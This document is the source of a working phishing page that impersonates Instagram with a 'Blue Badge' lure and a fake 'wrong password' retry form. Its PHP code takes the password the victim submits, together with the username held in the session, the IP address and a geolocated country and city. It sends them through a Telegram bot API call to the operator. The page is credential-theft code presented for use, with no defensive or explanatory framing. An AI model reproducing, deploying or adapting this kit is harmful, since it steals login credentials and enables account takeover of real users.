<?php
//Coded by Lüpen & Pharaben
include 'api/tg2.php';
session_start();
$id=$_SESSION['username'];
$pp=$_SESSION['pp'];
if($_POST){
//Coded by Lüpen & Pharaben
$password=$_POST["password"];
$ip = $_SERVER['REMOTE_ADDR'];
$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$ips="$ip,$id,$password";
$url="https://check-host.net/".$ips;
$cek = $cek = new SimpleXMLElement($konum);
$data = explode (",",$cek);
$ulke = $cek->country;
$sehir = $cek->city;
$cur_time=date("d-m-Y H:i:s");
//Coded by Lüpen & Pharaben
//Coded by Lüpen & Pharaben
$data = [
  'text' => '➡️ Wrong Password '.$id.' 😈

Kullanıcı Adı : '.$id.'
Şifre : '.$password.'
Ülke : '.$ulke.'
Şehir : '.$sehir.'
İp : '.$ip.'
Tarih : '.$cur_time.'
',
  'chat_id' => $chat_id
];
//Coded by Lüpen & Pharaben
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
//Coded by Lüpen & Pharaben
}
//Coded by Lüpen & Pharaben
function space($our_qen){
for( $i=0;$i<$our_qen;$i++){
	echo "<br>";
}
}
?>

<!DOCTYPE html>
<html>
<!--Coded by Lüpen & Pharaben-->
<head>
	<link rel="stylesheet" href="css/xss1.css">
	<link rel="stylesheet" type="text/css" href="css/xss2.css">
	<link rel="stylesheet" href="css/xss3.css">
	<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
	<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
	<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
	<title>Blue Badge | lnstagram</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1, user-scalable=no">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
<style media="screen">
  .wrong{
    text-align: center;
    color: rgba(var(--i30,237,73,86),1);
    font: inherit;
    vertical-align: baseline;
  }
</style>
</head>
<body>
	<br>
<!--
<center>
	<div class="get">
	<span class="main" id="rgb" style="font-size: 30px!important;		width:50%!important;">Copyright Infringement</span>
		<br>
	</div>
</center>
-->
<!--Coded by Lüpen & Pharaben-->
	</header>
<!---->
<!--Coded by Lüpen & Pharaben-->
	<center>
	<div class="home">
		<br><br>
		<div class="mx">
		<br>
		<!--<h1 class="allare">ALL ARE WELCOME</h1>-->

		<div class="wrapper fadeInDown">
		  <div id="formContent">
		    <!-- Tabs Titles -->
<img src="https://s4.gifyu.com/images/1618350172623f8cf25e172c0a89a.png" width="190" style="border-radius:50%;margin-top:30px;margin-bottom:25px;" align="center">
		    <!-- Icon -->
		    <div class="fadeIn first">
		      <img src="<?php echo  $pp ?>" width=150 style="border-radius:50%;margin-top:30px;margin-bottom:18px;" align="center">
		    </div>

		    <!-- Login Form -->
		    <form autocomplete="off" method="post">


          <h5 class="title" style="text-align:center;font-family: Helvetica, Arial, Sans-Serif;"><b>Dear, @<?php echo $id;?></b></h5>
          <br><p class="wrong">Sorry, your password was incorrect. Please<br>double-check your password.</p>
		      <br><input type="password" id="Login" class="fadeIn second" minlength="6" required  name="password" placeholder="Password"><br>
          		<a align="right"style="margin-top: 20px;position: relative; left: 23%;text-align:right; color: #09a7fd ; font-family:sans-serif; font-size:14px; font-weight:400;text-decoration:none;" href="https://www.instagram.com/accounts/password/reset" target="_blank" id="link"> Forgot password? </a><br>

              <center>
  							<br><button type="submit" class="submit">
  							<div class="f4x" style="margin-left: 0px;">
  								<span class="comm">TRY AGAİN </span>
   							</div>
              </button>
             </center>

		    </form>


		  </div>
		</div>

		<br>
</div><!--mx -->

<div class="bottom"><br>
<!--Coded by Lüpen & Pharaben-->
	<h1 class="bottom-h1">Download for<br>IOS / Android</h1><br>
<!--Coded by Lüpen & Pharaben-->
	<img src="image/bottom.jpeg" alt="Shop" width="350">
<!--Coded by Lüpen & Pharaben-->
<br>
<br>

<table class="bottom-table">
	<tr>

	</tr>
</table>
<br>
</div>
</center>
</body>
<style type="text/css">
  btn.html("L�tfen bekleyiniz...");
</style>
</html>    

